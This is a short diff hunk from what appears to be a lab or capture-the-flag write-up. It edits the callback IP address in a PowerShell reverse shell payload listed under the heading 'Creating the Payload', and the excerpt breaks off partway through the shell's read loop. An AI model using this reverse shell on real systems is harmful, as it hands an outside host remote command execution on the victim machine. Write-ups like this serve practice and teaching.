@@ -33,7 +33,7 @@ EOF
 Creating the Payload
 ```shell
 cat > payload.ps1 << 'EOF'
-$client = New-Object System.Net.Sockets.TCPClient('10.129.11.165',4444);
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.38',4444);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
